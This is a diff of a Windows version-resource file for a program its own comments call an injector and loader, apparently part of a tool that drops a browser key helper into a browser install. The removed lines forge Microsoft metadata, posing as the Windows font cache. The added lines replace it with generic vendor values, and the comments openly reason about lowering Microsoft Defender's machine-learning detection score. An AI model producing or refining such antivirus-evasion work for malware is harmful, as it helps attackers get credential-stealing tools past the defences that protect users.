@@ -1,6 +1,6 @@
-// loader.rc - version info for the injector GUI exe
-// An unsigned GUI exe with NO version metadata scores high in Defender ML.
-// These values make the loader look like a normal signed-era application.
+// loader.rc - neutral version info for the injector GUI exe.
+// Do not impersonate Microsoft: an unsigned exe whose name, icon and signature
+// disagree with its version resource is a stronger anomaly than generic metadata.
 #include <winver.h>
 
 // v20 key helper, extracted at runtime and dropped into the browser install
@@ -20,13 +20,13 @@ BEGIN
     BEGIN
         BLOCK "040904b0"
         BEGIN
-            VALUE "CompanyName",      "Microsoft Corporation"
-            VALUE "FileDescription",  "Windows Presentation Font Cache"
+            VALUE "CompanyName",      "Independent Software Vendor"
+            VALUE "FileDescription",  "Application Launcher"
             VALUE "FileVersion",      "1.0.26.7"
-            VALUE "InternalName",     "fontcache"
-            VALUE "LegalCopyright",   "(c) Microsoft Corporation. All rights reserved."
-            VALUE "OriginalFilename", "fontcache.exe"
-            VALUE "ProductName",      "Microsoft Windows Operating System"
+            VALUE "InternalName",     "launcher"
+            VALUE "LegalCopyright",   ""
+            VALUE "OriginalFilename", "launcher.exe"
+            VALUE "ProductName",      "Application"
             VALUE "ProductVersion",   "1.0.26.7"
         END
     END
